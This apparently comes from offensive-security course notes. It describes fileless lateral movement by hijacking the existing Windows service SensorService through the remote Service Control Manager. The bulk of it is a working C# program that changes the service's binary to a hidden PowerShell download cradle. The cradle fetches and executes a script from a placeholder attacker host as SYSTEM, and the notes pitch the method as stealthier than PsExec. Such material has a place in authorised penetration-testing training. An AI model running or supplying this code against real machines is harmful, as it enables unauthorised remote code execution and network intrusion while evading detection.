# 08.01 Fileless Lateral Movement Service Config Change

> Section 9.2 · OpenSCManagerW + ChangeServiceConfigA (no new service created)

## Overview

Authenticate to a remote machine's Service Control Manager, open an existing dormant service (SensorService), change its binary to a PowerShell download cradle, start it. Uses authentication from the current token (no password needed if token has rights). Creates no new service — harder to detect than PsExec.

## Steps

- **OpenSCManagerW** — target hostname, null database, SC_MANAGER_ALL_ACCESS (0xF003F).
- **OpenService** — service name `SensorService`, SERVICE_ALL_ACCESS (0xF01FF).
- **ChangeServiceConfigA** — change lpBinaryPathName to PowerShell download cradle; set SERVICE_DEMAND_START.
- **StartServiceA** — executes the service binary (runs as SYSTEM).

## Commands

### C# fileless SCM lateral movement

```csharp
using System;
using System.Runtime.InteropServices;

class FilelessLM {
    [DllImport("advapi32.dll",SetLastError=true,CharSet=CharSet.Unicode)]
    static extern IntPtr OpenSCManagerW(string m, string db, uint acc);
    [DllImport("advapi32.dll",SetLastError=true,CharSet=CharSet.Unicode)]
    static extern IntPtr OpenServiceA(IntPtr hScm, string svc, uint acc);
    [DllImport("advapi32.dll",SetLastError=true,CharSet=CharSet.Unicode)]
    static extern bool ChangeServiceConfigA(IntPtr h, uint type, uint start,
        uint err, string bin, string group, IntPtr tag, string deps,
        string acct, string pwd, string disp);
    [DllImport("advapi32.dll")]
    static extern bool StartServiceA(IntPtr h, int argc, string[] argv);

    static void Main() {
        string target = "appsrv01";
        IntPtr scm = OpenSCManagerW(target, null, 0xF003F);
        IntPtr svc = OpenServiceA(scm, "SensorService", 0xF01FF);
        // 3 = SERVICE_DEMAND_START  ; 0 = SERVICE_NO_CHANGE
        ChangeServiceConfigA(svc, 0xFFFFFFFF, 3, 0,
            "cmd /c powershell -nop -w hidden IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/run.ps1')",
            null, IntPtr.Zero, null, null, null, null);
        StartServiceA(svc, 0, null);
    }
}
```
